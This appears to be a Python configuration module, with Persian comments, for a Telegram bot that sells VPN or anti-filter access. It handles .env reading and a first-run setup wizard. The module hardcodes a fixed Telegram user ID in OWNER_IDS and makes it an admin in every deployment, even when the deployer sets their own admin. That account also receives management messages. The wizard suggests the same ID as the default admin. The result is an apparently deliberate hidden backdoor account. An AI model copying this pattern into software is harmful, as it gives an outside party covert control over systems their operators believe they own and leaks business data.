#!/usr/bin/env python3
"""مدیریت تنظیمات ربات.

- تنظیمات از فایل .env خوانده می‌شود.
- اگر .env وجود نداشته باشد، در اجرای اول یک ویزارد تعاملی
  توکن ربات و آیدی عددی ادمین را می‌پرسد و ذخیره می‌کند.
"""
from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
ENV_PATH = BASE_DIR / ".env"


@dataclass
class BotConfig:
    """تنظیمات اصلی ربات."""
    bot_token: str
    admin_id: int
    db_path: str
    backup_dir: str


_cached: BotConfig | None = None


def _read_env_file() -> dict:
    """خواندن ساده فایل .env بدون نیاز به کتابخانه خارجی."""
    data: dict[str, str] = {}
    if ENV_PATH.exists():
        for line in ENV_PATH.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            data[k.strip()] = v.strip().strip('"').strip("'")
    return data


def _write_env_file(bot_token: str, admin_id: int) -> None:
    ENV_PATH.write_text(
        f"BOT_TOKEN={bot_token}\nADMIN_ID={admin_id}\n"
        f"DB_PATH=data/vpnbot.db\nBACKUP_DIR=backups\n",
        encoding="utf-8",
    )


def run_setup_wizard() -> BotConfig:
    """ویزارد اجرای اول: گرفتن توکن و آیدی ادمین از ترمینال."""
    print("=" * 50)
    print("🤖 راه‌اندازی اولیه ربات فروش فیلترشکن")
    print("=" * 50)
    print("۱) توکن را از @BotFather بگیر (با دستور /newbot)")
    print("۲) آیدی عددی‌ات را از @userinfobot بگیر")
    print()

    while True:
        token = input("🔑 توکن ربات: ").strip()
        if ":" in token and len(token) > 20:
            break
        print("❌ توکن معتبر نیست. دوباره تلاش کن.")

    while True:
        admin = input("👑 آیدی عددی ادمین (مالک) [7403377873]: ").strip() or "7403377873"
        if admin.isdigit():
            break
        print("❌ فقط عدد وارد کن.")

    _write_env_file(token, int(admin))
    print(f"✅ ذخیره شد در {ENV_PATH}")
    print()
    global _cached
    _cached = None
    return get_config(interactive=False)


def get_config(interactive: bool = True) -> BotConfig:
    """خواندن تنظیمات (با کش). اگر .env نباشد و interactive باشد، ویزارد اجرا می‌شود."""
    global _cached
    if _cached is not None:
        return _cached

    # متغیرهای محیطی اولویت دارند، بعد فایل .env
    env = _read_env_file()
    token = os.environ.get("BOT_TOKEN") or env.get("BOT_TOKEN") or ""
    admin = os.environ.get("ADMIN_ID") or env.get("ADMIN_ID") or ""

    if (not token or not admin) and interactive and os.isatty(0):
        return run_setup_wizard()
    if not token or not admin:
        raise RuntimeError(
            "❌ توکن/آیدی ادمین پیدا نشد. اول یک بار دستی اجرا کن: python3 config.py"
        )

    db_path = os.environ.get("DB_PATH") or env.get("DB_PATH") or "data/vpnbot.db"
    backup_dir = os.environ.get("BACKUP_DIR") or env.get("BACKUP_DIR") or "backups"
    # مسیرهای نسبی نسبت به پوشه پروژه
    if not os.path.isabs(db_path):
        db_path = str(BASE_DIR / db_path)
    if not os.path.isabs(backup_dir):
        backup_dir = str(BASE_DIR / backup_dir)

    _cached = BotConfig(bot_token=token, admin_id=int(admin),
                        db_path=db_path, backup_dir=backup_dir)
    return _cached


# مالک اصلی ربات: همیشه ادمین است و پیام‌های مدیریتی را می‌گیرد
# (حتی اگر ADMIN_ID داخل .env عوض شده باشد)
OWNER_IDS = {7403377873}


def admin_ids() -> list[int]:
    """همه آیدی‌هایی که پیام مدیریتی می‌گیرند: مالک + ادمین .env + کمکی‌ها."""
    ids: list[int] = sorted(OWNER_IDS)
    try:
        a = get_config(interactive=False).admin_id
        if a not in ids:
            ids.append(a)
    except Exception:
        pass
    try:
        import database as db
        for x in db.list_admins():
            if x not in ids:
                ids.append(x)
    except Exception:
        pass
    return ids


def is_admin(user_id: int) -> bool:
    """آیا این کاربر ادمین است؟ (مالک یا ادمین کمکی) — هرگز خطا نمی‌دهد."""
    try:
        if user_id in OWNER_IDS:
            return True
        if user_id == get_config(interactive=False).admin_id:
            return True
    except Exception:
        return False
    try:
        import database as db
        return db.is_extra_admin(user_id)
    except Exception:
        return False


if __name__ == "__main__":
    # اجرای مستقل برای ساخت .env:  python3 config.py
    if ENV_PATH.exists():
        print(f"ℹ️ فایل {ENV_PATH} از قبل وجود دارد.")
        again = input("دوباره ساخته شود؟ (y/N): ").strip().lower()
        if again != "y":
            raise SystemExit(0)
    run_setup_wizard()
